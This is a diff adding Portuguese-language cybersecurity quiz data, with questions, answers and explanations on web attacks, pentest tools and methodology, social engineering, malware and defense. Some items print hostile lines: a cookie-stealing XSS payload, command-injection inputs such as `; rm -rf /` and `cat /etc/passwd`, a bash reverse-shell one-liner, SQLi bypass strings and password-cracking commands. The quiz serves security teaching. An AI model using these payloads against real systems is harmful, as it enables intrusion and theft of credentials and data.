+  {q:"Usuário usa mesma senha em 10 sites e um vaza. Qual o risco?",a:["Nenhum","Credential stuffing — atacante tenta a senha nos outros 9","Só onde vazou","Tem que ser admin"],correct:1,expl:"Reutilização é o pecado mortal. Atacantes automatizam tentativas com listas de vazamentos."},
+  {q:"Empresa tem firewall mas sem segmentação interna. Qual a fraqueza?",a:["Nenhuma","Atacante que entra circula livremente (sem defesa em profundidade)","Firewall é suficiente","WiFi é segura"],correct:1,expl:"Sem microsegmentação, breach lateral é trivial. Zero Trust + VLANs + ACLs internas mitigam."},
+  {q:"Sysadmin loga via SSH com senha. Como melhorar?",a:["Senha mais longa","Chaves SSH + MFA + desabilitar PasswordAuthentication","Mudar porta","Mais nada"],correct:1,expl:"Chaves resistentes a brute-force, MFA pra defesa em profundidade. PasswordAuth no SSH = atrai bots."},
+  {q:"Site mostra erro 'SQL syntax near...' em produção. O que isso revela?",a:["Nada","Erros verbosos vazam info — pista de injeção possível","Bug de UI","Aviso normal"],correct:1,expl:"Erros expostos auxiliam o atacante (versão DB, estrutura). Sempre mostre erro genérico em prod."},
+  {q:"Servidor não recebe patches há 2 anos. Qual o risco?",a:["Nenhum se firewall ok","CVEs conhecidos exploráveis publicamente","Mais estável","Sem risco"],correct:1,expl:"Patches fecham vulns. 2 anos = dezenas de CVEs públicos. Exploits prontos no Metasploit/ExploitDB."},
+  {q:"Backup roda diariamente mas nunca foi testado. Qual o risco?",a:["Nenhum","Backup pode estar corrompido — recovery falha quando precisar","Mais rápido","Mais seguro"],correct:1,expl:"'Backup que nunca foi restaurado não é backup, é esperança.' Teste recovery periodicamente."},
+  {q:"Empresa armazena CPF dos clientes sem necessidade. Qual o problema?",a:["Nenhum","Viola minimização de dados — aumenta impacto de breach + LGPD","Custa caro","Mais lento"],correct:1,expl:"Princípio: colete só o necessário. Menos dados = menor blast radius + compliance (LGPD/GDPR)."}
+];
+
+// ============ BLOCK 6 · WEB ATTACKS ============
+const QUIZ_B6_THEORY = [
+  {q:"O que é SQL Injection?",a:["Tipo de DDoS","Inserir SQL malicioso em input que vai pra query do banco","Phishing por SMS","Vírus de PDF"],correct:1,expl:"SQLi explora queries que concatenam input do user sem sanitização. Vaza/altera dados, às vezes RCE."},
+  {q:"O que é XSS (Cross-Site Scripting)?",a:["Hack de SSH","Injetar JavaScript que roda no browser de outros usuários","Quebrar TLS","Phishing"],correct:1,expl:"XSS injeta JS executado no contexto da vítima — rouba cookies, faz ações em nome dela, redireciona."},
+  {q:"Qual a diferença entre XSS Stored e Reflected?",a:["Nenhuma","Stored: payload salvo no servidor; Reflected: payload na URL/request","Stored é mais fraco","Reflected é só local"],correct:1,expl:"Stored persiste no banco (mais grave, atinge muitos). Reflected exige link enviado à vítima."},
+  {q:"O que é CSRF?",a:["Tipo de phishing","Forçar vítima logada a executar ação que ela não quis","Tipo de XSS","Brute-force de senha"],correct:1,expl:"CSRF: site malicioso submete request autenticado (cookies enviados automaticamente) à app legítima. Defesa: tokens, SameSite."},
+  {q:"O que é SSRF?",a:["Cross-Site Request Forgery","Server-Side Request Forgery — forçar servidor a fazer requests pra alvos","Tipo de XSS","Brute-force"],correct:1,expl:"SSRF: input controla URL que servidor acessa — atinge serviços internos (metadata cloud, RCE em libs)."},
+  {q:"O que é IDOR?",a:["Tipo de DDoS","Insecure Direct Object Reference — acessar recurso só trocando ID","Tipo de XSS","Phishing"],correct:1,expl:"IDOR: /user/1234/profile → trocar pra 1235 acessa perfil alheio. Falta de checagem de autorização."},
+  {q:"O que protege contra CSRF?",a:["HTTPS sozinho","CSRF tokens + SameSite cookies","Senha forte","Antivírus"],correct:1,expl:"Token único por request (verificado no server) + cookies SameSite=Lax/Strict. HTTPS não protege contra CSRF."},
+  {q:"Qual a defesa primária contra SQLi?",a:["Filtros de palavra","Prepared statements / parameterized queries","Validação de email","Captcha"],correct:1,expl:"Parameterized queries separam código de dados. Banco trata input só como valor, nunca como SQL."},
+  {q:"O que é command injection?",a:["Subir comando legítimo","Input do user concatenado em shell exec → atacante roda comandos no host","Tipo de XSS","Brute-force"],correct:1,expl:"App usa input em system()/exec() sem sanitizar. Atacante injeta `; rm -rf /` ou similar. RCE direto."},
+  {q:"O que é open redirect?",a:["Bug de DNS","Site redireciona pra URL controlada via parâmetro — habilita phishing convincente","Tipo de XSS","Erro 404"],correct:1,expl:"site.com/redirect?url=evil.com — vítima vê domínio legítimo no clique, acaba em phishing."}
+];
+
+const QUIZ_B6_PRACTICE = [
+  {q:"Você vê `query = 'SELECT * FROM users WHERE name = \"' + input + '\"'`. Que vuln?",a:["XSS","SQL Injection","CSRF","IDOR"],correct:1,expl:"Concatenação direta de input em SQL = SQLi clássico. Input `\" OR 1=1--` quebra a query."},
+  {q:"URL: /profile?id=42 — trocar pra id=43 mostra perfil alheio. Que vuln?",a:["SQLi","IDOR","XSS","CSRF"],correct:1,expl:"IDOR puro. Servidor confia no ID sem checar se user logado pode acessar aquele recurso."},
+  {q:"Input num campo de comentário: `<script>fetch('/evil?c='+document.cookie)</script>`. Que vuln?",a:["SQLi","XSS (Stored se o comentário é salvo)","CSRF","SSRF"],correct:1,expl:"Payload JS rendered sem escape → XSS. Se salvo no banco e mostrado a outros = Stored XSS."},
+  {q:"Site interno só acessível em 127.0.0.1, mas app externa tem campo 'image URL'. Risco?",a:["Nenhum","SSRF — atacante usa app pra atingir serviços internos","XSS","CSRF"],correct:1,expl:"App busca imagem por URL — atacante manda http://localhost/admin ou metadata.aws. Clássico SSRF."},
+  {q:"Form de transferência sem token. Atacante cria página `<img src='banco/transfer?to=mal&amt=1000'>`. Que ataque?",a:["SQLi","CSRF","XSS","IDOR"],correct:1,expl:"Vítima logada visita site malicioso → request automático com cookies → transfer feita. CSRF clássico."},
+  {q:"Code: `os.system('ping ' + user_input)`. Atacante manda `8.8.8.8; cat /etc/passwd`. O que rola?",a:["Erro","Command injection — comando extra executa","SQLi","XSS"],correct:1,expl:"; encadeia comandos no shell. Sem sanitização/escape, atacante executa qualquer coisa como o user do app."},
+  {q:"Você quer testar SQLi rápido num campo. Que payload tentar primeiro?",a:["<script>alert(1)</script>","' OR '1'='1 ou apenas '","../../../etc/passwd","admin"],correct:1,expl:"Aspa simples quebra strings em SQL → erro = pista de SQLi. ' OR '1'='1 bypassa logins clássicos."},
+  {q:"Site mostra `Bem-vindo, <input do user>` direto no HTML. Que vuln testar?",a:["SQLi","Reflected XSS","CSRF","SSRF"],correct:1,expl:"Output sem escape de HTML = XSS. Teste `<svg onload=alert(1)>` ou `<script>`."},
+  {q:"App lê PDF de URL fornecida pelo user. Atacante manda file:///etc/passwd. Risco?",a:["Nenhum","SSRF + Local File Read via esquema file://","XSS","CSRF"],correct:1,expl:"Schemes file://, gopher://, dict:// em libs HTTP frouxas leem disco local. Restrinja schemes."},
+  {q:"Você vê /login?next=http://evil.com. Que classe de vuln?",a:["SQLi","Open Redirect","XSS","CSRF"],correct:1,expl:"Se login redireciona pro `next` sem validar domínio = open redirect. Combinado com phishing é potente."}
+];
+
+// ============ BLOCK 7 · PENTEST TOOLS ============
+const QUIZ_B7_THEORY = [
+  {q:"Pra que serve o nmap?",a:["Editor de texto","Scanner de rede — descobre hosts, portas, serviços","Browser","Banco de dados"],correct:1,expl:"nmap é o canivete suíço de reconnaissance: TCP/UDP scan, OS fingerprint, version detection, NSE scripts."},
+  {q:"Pra que serve o gobuster/ffuf/feroxbuster?",a:["Scan de portas","Brute-force de diretórios/arquivos/subdomínios web","Quebrar senha","Sniff de rede"],correct:1,expl:"Bruteforcers de conteúdo web. Acham endpoints escondidos (/admin, /backup.zip) via wordlists."},
+  {q:"O que faz o Burp Suite?",a:["Antivírus","Proxy interceptador HTTP — inspecionar, modificar e replay de requests","Scanner de portas","SSH client"],correct:1,expl:"Burp intercepta tráfego entre browser e app web. Repeater, Intruder, Scanner. Ferramenta #1 de web pentest."},
+  {q:"Diferença entre John the Ripper e Hashcat?",a:["São iguais","Hashcat é GPU-first (rápido); John é CPU-focado com modos avançados","John só pra Windows","Hashcat só online"],correct:1,expl:"Hashcat aproveita GPU pra bilhões de hashes/seg. John é versátil em CPU, ótimo pra hashes incomuns."},
+  {q:"O que é Metasploit?",a:["Antivírus","Framework de exploits + payloads + post-exploitation","Browser","SSH"],correct:1,expl:"Metasploit padroniza exploits e payloads (Meterpreter). msfconsole automatiza muito do ciclo ofensivo."},
+  {q:"Quando usar Hydra?",a:["Editar texto","Brute-force de serviços (SSH, FTP, HTTP forms, etc)","Sniff","Scan de portas"],correct:1,expl:"Hydra (e medusa, ncrack) brutam credenciais em protocolos. Use só com autorização — gera muito ruído."},
+  {q:"O que é Wireshark?",a:["Editor","Analisador de pacotes — captura e dissecação de tráfego de rede","Browser","SSH"],correct:1,expl:"Wireshark captura pacotes (live ou pcap) e mostra cada camada decodificada. Essencial pra analisar protocolos."},
+  {q:"Pra que serve o SQLmap?",a:["Editor SQL","Automação de detecção e exploração de SQL injection","Backup de DB","Firewall"],correct:1,expl:"SQLmap testa parâmetros, identifica DBMS, extrai dados, às vezes consegue RCE. Padrão pra SQLi."},
+  {q:"O que é Nikto?",a:["Editor","Scanner web genérico — busca vulns comuns, configs ruins, arquivos default","Antivírus","Sniff"],correct:1,expl:"Nikto faz scan rápido de servidores web — detecta versões vulneráveis, defaults, headers ruins. Barulhento."},
+  {q:"Pra que serve o netcat (nc)?",a:["Browser","Canivete suíço de TCP/UDP — listener, conexão, transfer, bind shell","Antivírus","Scan"],correct:1,expl:"nc abre sockets crus. Reverse shell, port forward, banner grab, transferência de arquivos. Indispensável."}
+];
+
+const QUIZ_B7_PRACTICE = [
+  {q:"Você vê `nmap -sV 10.0.0.5 -p 22,80,443`. O que faz?",a:["Apaga arquivos","Scan TCP nas portas 22, 80, 443 com detecção de versão","Brute SSH","Captura pacotes"],correct:1,expl:"-sV detecta versão do serviço em cada porta. Saída: portas abertas + software/versão (ex: OpenSSH 8.2)."},
+  {q:"Qual ferramenta brute-force de logins SSH?",a:["nmap","Hydra (ou medusa, ncrack)","Wireshark","Burp"],correct:1,expl:"hydra -l user -P pass.txt ssh://host. Atenção: muito barulhento + maioria SSH bloqueia após N tentativas."},
+  {q:"Você quer achar /admin escondido num site. Qual ferramenta?",a:["nmap","gobuster/ffuf/feroxbuster com wordlist","sqlmap","Hydra"],correct:1,expl:"Content discovery: gobuster dir -u https://site -w wordlist.txt. Ache endpoints administrativos e backups."},
+  {q:"Você capturou um hash $2b$10$... — qual o tipo?",a:["MD5","bcrypt","SHA-1","NTLM"],correct:1,expl:"$2b$ é bcrypt. Outros prefixos: $1$ MD5crypt, $5$ SHA-256, $6$ SHA-512. hashid/hashcat --help identificam."},
+  {q:"Você quer interceptar e modificar request do browser. Que ferramenta?",a:["nmap","Burp Suite (ou OWASP ZAP)","Hydra","john"],correct:1,expl:"Configure browser → Burp como proxy. Intercept ON → modifique request → forward. Repeater pra repetir."},
+  {q:"Comando `curl -X POST -d 'user=admin&pass=test' https://site/login` faz?",a:["GET","POST com form data","Apaga login","Scan"],correct:1,expl:"curl -X POST com -d envia form-encoded body. Útil pra testar APIs manualmente ou em scripts."},
+  {q:"Você quer reverse shell rápido. Comando comum no Linux?",a:["nmap target","bash -i >& /dev/tcp/IP/PORT 0>&1","ssh user@host","ping"],correct:1,expl:"Bash one-liner abre conexão TCP pra atacante (nc -lvnp PORT espera). Clássico após RCE."},
+  {q:"Quer escanear todas as 65535 portas TCP do host. Comando?",a:["nmap host","nmap -p- host","ping host","scan host"],correct:1,expl:"-p- = todas as portas (1-65535). Demora. Use -T4 ou --min-rate pra acelerar (com cautela)."},
+  {q:"Vê resposta '301 Moved' pra /admin. O que indica?",a:["Erro","Recurso existe — pista de área administrativa","Bloqueio","Vazio"],correct:1,expl:"301/302/200 confirmam existência. 404 = nada. Em scan, filtre por códigos não-404."},
+  {q:"Quer crackear hash NTLM. Comando hashcat?",a:["hashcat -m 0","hashcat -m 1000 hash.txt wordlist.txt","hashcat decrypt","hashcat -c"],correct:1,expl:"-m 1000 = NTLM. -m 0 MD5, -m 1800 sha512crypt, -m 22000 WPA. Veja `hashcat --help`."}
+];
+
+// ============ BLOCK 8 · PENTEST METHODOLOGY ============
+const QUIZ_B8_THEORY = [
+  {q:"Quais as fases gerais de um pentest?",a:["Só explorar","Recon → Scanning → Exploitation → Post-Exploit → Reporting","Apenas relatório","Login direto"],correct:1,expl:"Metodologia clássica (PTES). Cada fase tem objetivos e ferramentas próprias. Reporting é tão crítico quanto o resto."},
+  {q:"O que é OSINT?",a:["Tipo de hash","Open Source Intelligence — coleta de info pública","Antivírus","Scanner"],correct:1,expl:"OSINT: LinkedIn, GitHub, Shodan, certificados, leaks, redes sociais. Faz parte do recon passivo."},
+  {q:"Diferença entre recon passivo e ativo?",a:["São iguais","Passivo não toca o alvo; ativo envia requests detectáveis","Ativo é mais lento","Passivo é ilegal"],correct:1,expl:"Passivo: OSINT (sem contato direto). Ativo: nmap, requests à app — gera logs no alvo. Importa pra stealth."},
+  {q:"O que é lateral movement?",a:["Tipo de phishing","Mover-se entre hosts internos após o foothold inicial","Trocar de IP","Renomear arquivo"],correct:1,expl:"Comprometeu uma máquina? Pivote pra outras (credenciais reused, share, lateral exploit) → mais valor."},
+  {q:"O que é privilege escalation?",a:["Trocar senha","Subir de user comum pra root/admin","Sair do sistema","Logout"],correct:1,expl:"Privesc: explorar misconfig (SUID, sudo perm, kernel) pra ganhar privilégios maiores. Vertical (user→root) vs horizontal (user→outro user)."},
+  {q:"O que é persistência em pentest?",a:["Backup","Manter acesso mesmo após reboots/patches","Documentar","Pingar host"],correct:1,expl:"Após o foothold, persistir via cron, systemd unit, SSH key, registry run, scheduled task — garantindo retorno."},
+  {q:"O que é a fase de reporting?",a:["Reiniciar host","Documentar findings, severidade, impacto e remediação pro cliente","Apagar logs","Phishing"],correct:1,expl:"Report é o entregável real. Sem relatório claro com PoC e remediação, o pentest perde valor pra cliente."},
+  {q:"Diferença entre red team e pentest?",a:["São iguais","Pentest: encontra vulns; Red Team: emula adversário real, testa detecção","Pentest é mais agressivo","Red team é só DDoS"],correct:1,expl:"Pentest cobre o máximo de superfície/findings. Red team é objetivo-driven, stealthy, testa blue team também."},
+  {q:"O que é scope em um engagement?",a:["Tipo de scan","Definição do que pode/não pode ser testado","Senha","Antivirus"],correct:1,expl:"Scope = alvos, métodos, horários, restrições, ROE. Sair do escopo = potencial problema legal e contratual."},
+  {q:"O que são ROE (Rules of Engagement)?",a:["Tipo de exploit","Regras combinadas: horários, contatos emergência, sistemas críticos, ferramentas permitidas","Login","Antivírus"],correct:1,expl:"ROE protege ambos os lados. Documentam o que é aceitável e como agir em incidentes durante o teste."}
+];
+
+const QUIZ_B8_PRACTICE = [
+  {q:"Você achou um binário SUID que pode ser explorado. Qual fase?",a:["Recon","Privilege Escalation","Reporting","OSINT"],correct:1,expl:"SUID-root explorável (ver GTFOBins) = vetor clássico de privesc vertical (user → root)."},
+  {q:"Você usa LinkedIn pra mapear funcionários da empresa-alvo. Qual fase?",a:["Exploitation","Recon / OSINT (passivo)","Reporting","Privesc"],correct:1,expl:"LinkedIn, GitHub, Twitter dão estrutura da org, nomes pra phishing, tech stack. OSINT puro."},
+  {q:"Você está numa máquina comprometida e usa as creds dela pra logar em outra. Qual fase?",a:["Recon","Lateral Movement","Reporting","OSINT"],correct:1,expl:"Pivote horizontal — usar comprometido pra alcançar próximo alvo. Pass-the-Hash, reused creds, etc."},
+  {q:"Você roda nmap detalhado pra mapear toda rede interna. Qual fase?",a:["Recon Ativo / Scanning","OSINT","Reporting","Phishing"],correct:0,expl:"Scanning ativo (gera tráfego, logs) — diferente de OSINT que é passivo. Parte do recon interno."},
+  {q:"Você adiciona sua SSH key em ~/.ssh/authorized_keys do user comprometido. Qual fase?",a:["Recon","Persistência","Reporting","OSINT"],correct:1,expl:"Garantir acesso futuro mesmo se a senha mudar. Persistência básica via SSH key trust."},
+  {q:"Você ganhou RCE como www-data. Próximo passo lógico?",a:["Parar","Enumerar sistema + buscar privesc (linpeas, sudo -l)","Reportar e parar","Reiniciar"],correct:1,expl:"www-data é user de baixo privilégio. Enumerar (linpeas/pspy) + buscar privesc vertical pra root."},
+  {q:"Cliente diz: 'só testem o domínio app.cliente.com, sem DoS'. O que isso define?",a:["Senha","Escopo + ROE","Backup","CVE"],correct:1,expl:"Escopo (1 domínio) + ROE (sem DoS). Sair disso = problema. Documente assinado antes de começar."},
+  {q:"Você acha credenciais hardcoded num repo GitHub público da empresa. Qual fase?",a:["Exploit","Recon / OSINT","Privesc","Reporting"],correct:1,expl:"OSINT em repos públicos rende muito (chaves AWS, .env, tokens). Sempre olhe org + funcionários."},
+  {q:"Você termina o teste e precisa entregar PoCs detalhadas + remediação. Qual fase?",a:["Recon","Reporting","Scanning","Persistência"],correct:1,expl:"Reporting fecha o ciclo. PoC reproduzível, severidade (CVSS), recomendações = o produto que o cliente paga."},
+  {q:"Após explorar, você quer apagar logs pra esconder rastros. Em pentest legítimo?",a:["Sempre apagar","NUNCA — viola ROE e atrapalha detecção do blue team","Apagar só /var","Depende"],correct:1,expl:"Em pentest autorizado, preserve logs (cliente quer ver detecção). Log clearing só em red team com escopo claro."}
+];
+
+// ============ BLOCK 9 · SOCIAL ENGINEERING ============
+const QUIZ_B9_THEORY = [
+  {q:"O que é engenharia social?",a:["Hack de hardware","Manipular pessoas pra obter info ou ação","Tipo de scan","Antivirus"],correct:1,expl:"SE explora o humano (autoridade, urgência, reciprocidade, medo). 'O elo mais fraco é a pessoa.'"},
+  {q:"Diferença entre phishing e spear phishing?",a:["Idênticos","Phishing: massa genérica; Spear: alvo específico, personalizado","Spear é só SMS","Phishing é só email"],correct:1,expl:"Spear phishing usa info da vítima (nome, cargo, projeto) — taxa de sucesso muito maior."},
+  {q:"O que é pretexting?",a:["Bug","Criar pretexto/identidade falsa convincente pra obter info","Tipo de XSS","Senha"],correct:1,expl:"Atacante finge ser TI, fornecedor, autoridade — pretexto justifica o pedido (resetar senha, mandar arquivo)."},
+  {q:"O que é baiting?",a:["Phishing","Deixar 'isca' (USB, download) que a vítima coleta voluntariamente","Spam","DDoS"],correct:1,expl:"Baiting explora curiosidade. USB 'Salários 2024' no estacionamento — alguém pluga, malware roda."},
+  {q:"O que é watering hole attack?",a:["DDoS","Comprometer site frequentado pelo alvo pra atingi-lo indiretamente","Phishing massivo","SQLi"],correct:1,expl:"Atacante infecta site de nicho do alvo (forum da indústria). Espera vítima visitar → exploit no browser."},
+  {q:"O que é vishing?",a:["XSS","Voice phishing — phishing por telefone","Tipo de SQL","Sniff"],correct:1,expl:"Vishing usa ligação. 'Aqui é da TI, sua conta foi bloqueada, me dê seu código MFA.' Muito eficaz."},
+  {q:"O que é smishing?",a:["SMS phishing","Tipo de scanner","Antivirus","Worm"],correct:0,expl:"SMS phishing — link malicioso por SMS. Comum: 'Sua entrega está pendente, atualize endereço aqui.'"},
+  {q:"O que é tailgating?",a:["Tipo de DDoS","Entrar fisicamente atrás de funcionário autorizado","XSS","Phishing por email"],correct:1,expl:"Engenharia social física. Atacante segue alguém com crachá por porta segura — fingindo carregar caixas, etc."},
+  {q:"Qual a melhor defesa contra phishing?",a:["Só técnica","Treinamento contínuo + MFA + filtros de email","Antivírus","Trocar IP"],correct:1,expl:"Não tem bala de prata. Defesa em profundidade: simulação de phishing, MFA, filtros, reporte fácil."},
+  {q:"O que é BEC (Business Email Compromise)?",a:["Tipo de XSS","Atacante personifica executivo pra induzir funcionários a pagar/transferir","DDoS","Worm"],correct:1,expl:"BEC: email 'do CEO' pedindo transferência urgente. Sem malware, só engenharia. Bilhões em perdas/ano."}
+];
+
+const QUIZ_B9_PRACTICE = [
+  {q:"Atacante deixa pendrives 'CONFIDENCIAL' no estacionamento. Que técnica?",a:["Phishing","Baiting","SQLi","DDoS"],correct:1,expl:"Baiting clássico. Pendrive com autorun/LNK malicioso ou HID emulando teclado (Rubber Ducky)."},
+  {q:"Atacante liga fingindo ser TI pra obter senha. Que técnica?",a:["Vishing + pretexting","XSS","SQLi","Tailgating"],correct:0,expl:"Telefone (vishing) + identidade falsa (pretexting). 'Estamos resetando contas, me confirme a senha atual.'"},
+  {q:"Email genérico 'Sua conta Netflix foi bloqueada'. Que técnica?",a:["Spear phishing","Phishing (massa)","Vishing","Baiting"],correct:1,expl:"Phishing em massa — manda pra milhões esperando que % seja Netflix user e morda."},
+  {q:"Email pra você: 'Oi João, sobre o projeto X que está com cliente Y, segue NF anexa'. Que técnica?",a:["Phishing genérico","Spear phishing (info específica)","DDoS","Tailgating"],correct:1,expl:"Personalização indica reconnaissance prévio. Taxa de clique muito maior — spear phishing."},
+  {q:"Alguém entra no prédio segurando café e diz 'mãos ocupadas, abre pra mim?'. Que técnica?",a:["Phishing","Tailgating","Vishing","SQLi"],correct:1,expl:"Tailgating com pretexto. Empatia + falta de cultura de segurança física = entrada fácil."},
+  {q:"Site de notícias do setor é hackeado e infecta visitantes. Que técnica?",a:["Phishing","Watering Hole","SQLi","Vishing"],correct:1,expl:"Atacante prevê audiência-alvo do site comprometido. Mais cirúrgico que phishing em massa."},
+  {q:"SMS: 'Banco X — clique pra desbloquear cartão: http://bit.ly/xyz'. Que técnica?",a:["Vishing","Smishing","Baiting","Tailgating"],correct:1,expl:"Smishing. URLs encurtadas escondem domínio. Sempre ligue pro número oficial em vez de clicar."},
+  {q:"Email aparentemente do CEO ao financeiro: 'transferência urgente, sigilo total'. Que técnica?",a:["Phishing massa","BEC (Business Email Compromise)","XSS","Baiting"],correct:1,expl:"BEC explora autoridade + urgência + sigilo (impede verificação). Mitiga: dual-control + verificação out-of-band."},
+  {q:"Como reduzir cliques em phishing na empresa?",a:["Bloquear email","Simulações periódicas + treinamento + reporte fácil + filtros + MFA","Trocar antivírus","Mudar firewall"],correct:1,expl:"Programa contínuo: simulações realistas, feedback educativo, MFA pra reduzir impacto quando clicar acontece."},
+  {q:"Você é cliente e recebe link 'rastrear pedido' por SMS após compra real. Como verificar?",a:["Clicar","Acessar app/site oficial direto sem clicar no link","Responder o SMS","Ignorar"],correct:1,expl:"Sempre vá ao canal oficial digitando URL. SMS pode ser smishing oportunista mesmo após compra real."}
+];
+
+// ============ BLOCK 10 · MALWARE ============
+const QUIZ_B10_THEORY = [
+  {q:"Diferença entre vírus e worm?",a:["Iguais","Vírus precisa de host/ação humana; worm se propaga sozinho via rede","Worm é só pra Windows","Vírus é mais lento"],correct:1,expl:"Worm explora vulns de rede pra replicar autonomamente (Conficker, WannaCry). Vírus anexa a arquivo/macro."},
+  {q:"O que é ransomware?",a:["Antivírus","Malware que criptografa dados e exige resgate","Tipo de scan","Phishing"],correct:1,expl:"Ransomware (CryptoLocker, LockBit) criptografa arquivos, exige BTC/Monero. Pode também exfiltrar (double extortion)."},
+  {q:"O que é um rootkit?",a:["Software ok","Malware que se esconde profundamente (kernel/firmware) pra evadir detecção","Tipo de senha","SQL"],correct:1,expl:"Rootkit modifica kernel/syscalls/firmware pra esconder processos, conexões, arquivos. Difícil detectar e remover."},
+  {q:"O que é um trojan?",a:["Antivírus","Malware disfarçado de software legítimo","Hash type","Loop"],correct:1,expl:"Trojan se apresenta como app útil (jogo, crack, instalador). Após exec, instala backdoor/RAT/etc."},
+  {q:"O que é spyware?",a:["Antivírus","Malware que coleta info do usuário sem consentimento","Phishing","SQLi"],correct:1,expl:"Spyware monitora atividade (keylog, screenshot, credentials). Pode ser comercial (stalkerware) ou estatal."},
+  {q:"O que é adware?",a:["Antivírus","Malware focado em mostrar anúncios + às vezes coletar dados","Tipo de firewall","Worm"],correct:1,expl:"Adware financia atacante via cliques/impressões. Frequentemente vem com PUPs em instaladores 'gratuitos'."},
+  {q:"O que é botnet?",a:["Tipo de hash","Rede de hosts infectados controlados remotamente","Antivírus","SQLi"],correct:1,expl:"Botnet = milhares de zombies sob C2 do atacante. Usadas pra DDoS, spam, mineração, brute-force distribuído."},
+  {q:"O que é C2 (Command and Control)?",a:["Compiler","Servidor que envia comandos e recebe dados dos hosts infectados","Antivírus","Tipo de scan"],correct:1,expl:"C2 é o cérebro da operação. Beacons periódicos do malware checam ordens. Detectar C2 = matar a campanha."},
+  {q:"O que é fileless malware?",a:["Sem arquivo","Malware que roda em memória usando ferramentas legítimas (PowerShell, WMI)","Sem vírus","Sem rede"],correct:1,expl:"Fileless evita disco — abusa LOLBins (living off the land). Difícil pra antivírus tradicional pegar."},
+  {q:"O que é um keylogger?",a:["Tipo de teclado","Malware que captura teclas digitadas","Antivírus","Firewall"],correct:1,expl:"Keylogger registra teclas — captura senhas, mensagens. Pode ser software (driver, hook) ou hardware (USB inline)."}
+];
+
+const QUIZ_B10_PRACTICE = [
+  {q:"Arquivos com extensões mudadas pra .lockbit e nota pedindo BTC. Que malware?",a:["Vírus","Ransomware","Spyware","Adware"],correct:1,expl:"Renomeio + nota de resgate = ransomware. Verifique escopo, isole, NÃO pague (sem garantia + financia crime)."},
+  {q:"Processo svchost.exe legítimo em path C:\\Users\\X\\AppData\\... rodando. Suspeito?",a:["Não","Sim — svchost real só roda em C:\\Windows\\System32","Tudo ok","É driver"],correct:1,expl:"Malware adora se chamar svchost/explorer/csrss. Path errado é red flag. Compare path + hash + assinatura."},
+  {q:"Você vê tráfego beacon constante de host pra IP estrangeiro a cada 60s. Provável?",a:["Update","C2 beaconing — host comprometido","Backup","Nada"],correct:1,expl:"Intervalos regulares com payloads pequenos = beacon. Investigue processo origem, isole, hunt mesmo padrão."},
+  {q:"Usuário diz que cliques abrem anúncios random. Provável?",a:["Vírus de boot","Adware/PUP","Ransomware","Worm"],correct:1,expl:"Pop-ups + redirecionamentos = adware/browser hijacker. Remova extensões + scan + revise downloads recentes."},
+  {q:"Malware se espalha sozinho pela rede via SMB. Que categoria?",a:["Trojan","Worm","Adware","Spyware"],correct:1,expl:"Worm — autoreplicação via vuln (ex: EternalBlue/WannaCry). Patche SMB e segmenta rede."},
+  {q:"Usuário baixou 'crack' de jogo, depois sumiram criptos da carteira. Que provável?",a:["Vírus de boot","Trojan + infostealer/clipper","Adware","Worm"],correct:1,expl:"Cracks são vetor clássico de trojans com info-stealer/clipper (substitui endereço cripto na clipboard)."},
+  {q:"Você vê PowerShell rodando comando codificado em base64 sem dropar arquivo. Provável?",a:["Update normal","Fileless malware (LOLBin)","Antivírus","Backup"],correct:1,expl:"powershell -enc <base64> sem dropar exe = fileless típico. Habilite Script Block Logging + AMSI."},
+  {q:"Capacidade de esconder processos do `ps`/Task Manager. Que tipo?",a:["Adware","Rootkit","Phishing","SQL"],correct:1,expl:"Rootkit hooka APIs/syscalls pra ocultar artefatos. Detecte com ferramentas que não confiam no SO comprometido."},
+  {q:"Programa registra todas as teclas em arquivo escondido. Tipo?",a:["Adware","Keylogger (spyware)","Ransomware","Worm"],correct:1,expl:"Coleta de input do user = keylogger. Defesa: EDR, MFA pra reduzir impacto + scan periódico."},
+  {q:"Empresa atingida por ransomware. Próximo passo crítico?",a:["Pagar","Isolar hosts, acionar IR, verificar backups offline, NÃO desligar pra preservar evidência","Reiniciar","Ignorar"],correct:1,expl:"Isolar (rede), preservar evidência (memória/disco), acionar IR/legal, testar restore. Pagar é última opção e desencorajado."}
+];
+
+// ============ BLOCK 11 · DEFENSE ============
+const QUIZ_B11_THEORY = [
+  {q:"Diferença entre IDS e IPS?",a:["Iguais","IDS detecta e alerta; IPS detecta e bloqueia","IDS é mais novo","IPS só pra Linux"],correct:1,expl:"IDS (Snort em modo IDS) só alerta. IPS bloqueia inline. IPS pode causar falso positivo bloqueador — calibre regras."},
+  {q:"Pra que serve um SIEM?",a:["Antivírus","Centralizar logs, correlacionar eventos e gerar alertas","Firewall","Backup"],correct:1,expl:"SIEM (Splunk, ELK, Sentinel) agrega logs de toda infra. Correlation rules detectam padrões de ataque."},
+  {q:"Diferença entre EDR e antivírus tradicional?",a:["Iguais","AV: signatures; EDR: behavior + telemetria + response","EDR é mais antigo","AV é mais caro"],correct:1,expl:"EDR (CrowdStrike, SentinelOne) monitora comportamento + processo tree, permite hunt, contém endpoints. Vai além de hash matching."},
+  {q:"Pra que serve um WAF?",a:["Acelerar wifi","Filtrar tráfego HTTP/S — bloqueia SQLi, XSS, exploits web","Antivírus","Backup"],correct:1,expl:"WAF (Cloudflare, ModSecurity) inspeciona requests aplicação. Bloqueia payloads conhecidos + custom rules."},
+  {q:"O que é hardening?",a:["Adicionar features","Configurar sistema pra mínima superfície de ataque","Senha forte só","Backup"],correct:1,expl:"Hardening: remover serviços/users/permissões desnecessárias, patches, baseline (CIS Benchmarks)."},
+  {q:"Pra que serve patching?",a:["Aparência","Corrigir vulnerabilidades de software","Apenas update visual","Backup"],correct:1,expl:"Patching fecha CVEs. Vital + frequentemente negligenciado. Pentest sempre acha hosts sem patch."},
+  {q:"O que são logs de auditoria?",a:["Backup","Registros de ações no sistema pra detectar/investigar","Antivirus","Firewall"],correct:1,expl:"Audit logs (auditd, Sysmon, Windows Event Log) registram syscalls, logins, mudanças. Forense depende deles."},
+  {q:"O que é segmentação de rede?",a:["Antivirus","Dividir rede em zonas isoladas pra limitar movimento lateral","Backup","Mais wifi"],correct:1,expl:"VLANs, subnets, microsegmentação. Breach em DMZ não vira breach em DB se segmentado. Essencial pra Zero Trust."},
+  {q:"Pra que serve backup?",a:["Acelerar","Recuperar dados após perda/ransomware/falha","Antivirus","Firewall"],correct:1,expl:"Backup é o último seguro contra ransomware/desastre. Regra 3-2-1: 3 cópias, 2 mídias, 1 offsite/offline."},
